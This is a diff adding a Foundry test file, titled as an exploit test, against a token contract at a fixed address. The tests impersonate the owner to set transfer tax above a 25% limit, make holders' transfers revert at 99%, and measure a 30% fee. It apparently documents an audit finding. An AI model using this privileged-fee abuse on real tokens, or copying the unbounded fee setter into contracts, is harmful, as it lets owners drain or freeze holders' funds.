@@ -1,0 +1,95 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.4;
+
+import "forge-std/Test.sol";
+
+interface GDG {
+    function owner() external view returns (address);
+    function setTaxFeePercent(uint256 taxFee) external;
+    function _taxFee() external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function isExcludedFromFee(address account) external view returns (bool);
+    function includeInFee(address account) external;
+    function _liquidityFee() external view returns (uint256);
+    function excludeFromFee(address account) external;
+    function totalSupply() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    address constant TARGET = 0x048FFa8aAE293470932388b615A90A8265bFB25F;
+    GDG public gdg;
+
+    address public owner;
+    address public user1 = address(0x1111);
+    address public user2 = address(0x2222);
+
+    function setUp() public {
+        gdg = GDG(TARGET);
+        owner = gdg.owner();
+        vm.label(TARGET, "GDG");
+        vm.label(owner, "Owner");
+        vm.label(user1, "User1");
+        vm.label(user2, "User2");
+    }
+
+    function testSetTaxFeeAbove25Percent() public {
+        // Initially tax fee is 0
+        assertEq(gdg._taxFee(), 0);
+
+        // Owner sets tax fee to 30% (exceeds 25% limit)
+        vm.prank(owner);
+        gdg.setTaxFeePercent(30);
+
+        // Verify storage reflects the value
+        assertEq(gdg._taxFee(), 30);
+    }
+
+    function testTaxFeeAbove100CausesRevert() public {
+        // Transfer some tokens to user1 (owner is excluded from fees)
+        uint256 transferAmount = 1000 * 10**9; // 1000 tokens assuming 9 decimals
+        vm.prank(owner);
+        gdg.transfer(user1, transferAmount);
+        assertEq(gdg.balanceOf(user1), transferAmount);
+
+        // Owner sets tax fee to 99% (total fee 99% + liquidity 6% = 105%)
+        vm.prank(owner);
+        gdg.setTaxFeePercent(99);
+
+        // Now user1 tries to transfer to user2; this will revert due to underflow in _getTValues
+        // because tTransferAmount = amount - tax - liquidity would be negative.
+        vm.expectRevert("SafeMath: subtraction overflow");
+        vm.prank(user1);
+        gdg.transfer(user2, transferAmount / 2);
+    }
+
+    function testHighTaxFeeAffectsTransferAmount() public {
+        // Transfer tokens from owner to user1 (no fee)
+        uint256 transferAmount = 10000 * 10**9;
+        vm.prank(owner);
+        gdg.transfer(user1, transferAmount);
+        assertEq(gdg.balanceOf(user1), transferAmount);
+
+        // Owner sets tax fee to 30% (liquidity fee remains 6%)
+        vm.prank(owner);
+        gdg.setTaxFeePercent(30);
+
+        // User1 sends half of balance to user2
+        uint256 sendAmount = transferAmount / 2;
+        uint256 expectedFeeTotal = (sendAmount * 36) / 100; // tax 30% + liquidity 6%
+        uint256 expectedReceived = sendAmount - expectedFeeTotal;
+
+        vm.prank(user1);
+        gdg.transfer(user2, sendAmount);
+
+        // User2's balance increased by expectedReceived (ignoring reflection rounding)
+        uint256 user2BalanceAfter = gdg.balanceOf(user2);
+        // Accept small rounding differences from reflection algorithm
+        assertApproxEqAbs(user2BalanceAfter, expectedReceived, 1);
+
+        // User1's balance reduced by sendAmount
+        assertEq(gdg.balanceOf(user1), transferAmount - sendAmount);
+    }
+}
+```
